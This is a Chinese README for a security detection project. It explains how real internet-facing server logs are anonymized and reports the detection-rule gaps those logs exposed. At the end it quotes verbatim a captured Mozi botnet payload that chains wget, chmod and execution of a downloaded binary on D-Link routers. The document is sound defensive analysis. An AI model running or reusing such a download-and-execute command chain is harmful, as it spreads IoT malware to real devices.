# 公网实战样本（脱敏）

这里的日志来自一台真实部署在公网的测试机，用来验证检测规则在**真实流量**上的表现，而不是只跑模拟数据。

## 为什么要脱敏

原始日志里有三类标识，都会暴露身份：

| 类型 | 举例（已改写） | 泄露后果 |
|---|---|---|
| 自己的服务器 IP | `203.0.113.x` 类 | 直接告诉别人机器在哪，会招来更多扫描 |
| 自己的出口 IP | 家宽段 | 暴露个人所在网络 |
| 云实例 ID（主机名） | 阿里云 `iZ` 开头的 22 位串 | 比 IP 更隐蔽：能直接定位到控制台里的那台机器，等于身份证号 |
| 攻击者 IP | 巴西家宽、云厂商机房 | 可能牵连第三方（很多肉鸡的主人是无辜的） |

所以公开前统一替换。**替换工具是 `tools/anonymize_log.py`，方法可复现。**

## 脱敏策略

- **同一 IP → 同一假名**：用 sha256 映射，保证整份日志里同一个源始终对应同一个假名。这样「IP 与 IP 之间的关系」保留下来了，但看不出真实身份。
- **假名用文档保留网段**：`192.0.2.0/24`、`198.51.100.0/24`、`203.0.113.0/24` 是 RFC 5737 专供示例的地址段，任何人一眼就知道这是脱敏数据。
- **主机名一并换掉**：`iZxxxxxxxxxxxxxxxxxxxxZ` → `srv-<hash8>`，保留「是同一台主机」这个事实。
- **时间、端口、URL、UA 全部保留**：攻击特征一个不丢，检测结果可复现。
- **内网 IP 不处理**：`10.x`、`192.168.x`、`172.16-31.x` 不敏感，而且「内网还是外网」是判断攻击路径的重要信息。

## 怎么验证脱敏没伤到特征

```bash
python tools/anonymize_log.py 原始.log -o samples/xxx.sample.log
```

工具会打印替换了多少个 IP、以及有哪些「长得像 IP 的版本号」被识别并保持原样。

**这一步踩过坑**：初版正则把 UA 里的 `Chrome/157.0.0.0` 当成 IP 替换成了假地址，等于把最重要的特征抹掉了。所以工具现在带一道 `VERSION_CONTEXT` 语义检查，并在识别到版本号时明确提示，不静默处理。

## 实测记录

完整的事件经过、攻击样本的逐字解读、以及从数据里发现的检测缺陷，见仓库外的学习笔记 `14_公网服务器实战_2026-11-10.md`。这里只放原始数据。

### 11-10 上线首 15 分钟

3 个境外源的探测：一个向 HTTP 端口发 TLS 握手包的协议探测器、一个伪造 UA 的爬虫、两个猜 root 密码的 SSH 扫描器。这说明互联网背景辐射是持续存在的——**没被点名攻击，不等于没人试过。**

### 11-11 隔夜累积（这组数据推翻了三条规则）

305 行、52 个独立源、34 次 400 响应。从这组数据里发现的问题：

1. **400 请求完全不被检测**。原有规则全是内容匹配（SQLi/XSS/路径穿越），而 TLS 握手包打明文端口这类探测**不含任何 payload**，内容层无迹可寻 → 新增 `behav_http_400_burst`。
2. **UA 词表漏了真实存在的测绘引擎**。日志里出现 `ForestEngine`、`CensysInspect`、`InternetMeasurement`，一条都没报 → 扩充词表。
3. **单 IP 阈值看不见分布式扫描**。9 个不同 IP 各发一次 `/.git/config`，UA 完全相同。按 IP 看每个都无辜，按指纹看是一个组织在批量调度 → 新增 `behav_distributed_scan`。
4. **解析失败率是假的**。auth.log 报 71.4% 失败，实际真正的格式错误是 0 行，那 417 行是 CRON 和 systemd 的记录，只是不含 IP → 拆成「解析失败」和「跳过（无来源 IP）」两个指标。

其中第 1 条抓到的最严重的样本是一个 **Mozi 僵尸网络**载荷：
`27;wget http://%s:%d/Mozi.m -O -> /tmp/Mozi.m;chmod 777 /tmp/Mozi.m;/tmp/Mozi.m dlink.mips`
——针对 D-Link 路由器的 IoT 蠕虫，用 `;` 分隔命令链下发。这种载荷模板里带 `%s:%d` 占位符，说明是**批量生成**的，不是人在手打。
